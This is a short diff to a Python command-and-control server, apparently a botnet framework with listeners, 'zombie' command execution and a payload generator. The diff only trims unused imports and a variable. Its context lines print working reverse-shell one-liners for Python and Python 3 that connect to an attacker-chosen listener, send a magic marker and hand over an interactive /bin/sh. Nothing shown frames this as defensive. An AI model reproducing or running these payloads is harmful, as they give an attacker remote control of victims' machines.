@@ -2,10 +2,6 @@ import socket
 import threading
 import time
 import uuid
-import json
-import re
-import subprocess
-import os
 
 C2_MAGIC = b"YGG!"
 LISTENERS = {}
@@ -490,7 +486,7 @@ def execute_on_zombie(zombie_id, command):
         }
 
 def generate_payload(listener_ip, listener_port, payload_type="python", arch="x64"):
-    magic_hex = C2_MAGIC.hex()
+    C2_MAGIC.hex()
     payloads = {
         "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{C2_MAGIC.decode()}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
         "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{C2_MAGIC.decode()}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
